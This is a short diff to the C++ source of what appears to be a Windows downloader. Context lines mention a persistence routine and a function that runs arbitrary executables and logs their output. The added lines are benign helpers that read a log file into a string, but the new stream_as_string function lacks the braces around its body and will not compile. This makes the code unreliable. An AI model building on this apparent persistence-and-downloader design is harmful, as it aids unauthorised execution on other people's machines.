@@ -19,6 +19,7 @@
 #include <fstream>
 #include <Shlobj.h>
 #include <filesystem>
+#include <iterator>
 #include "winnls.h"
 #include "shobjidl.h"
 #include "objbase.h"
@@ -48,6 +49,13 @@ string randomId(size_t length);
 
 const string fileName = "Downloader.exe";
 
+std::string stream_as_string( std::istream& stm )
+	 return { std::istreambuf_iterator<char>(stm), std::istreambuf_iterator<char>{} } ;
+
+string getLog(string filename){
+	std::ifstream file(filename);
+	return stream_as_string(file);
+}
 /***
  * persist | Attempts to create persistence on the machine
  ***/
@@ -91,9 +99,8 @@ int setupDirectory() {
 }
 
 
-
 /***
-* runScript | Runs given script and stores the log output on the given file
+* runScript | Runs given .exe/script and stores the log output on the given file
 ***/
 int runScript(char* file_source, char* file_output) {
 	
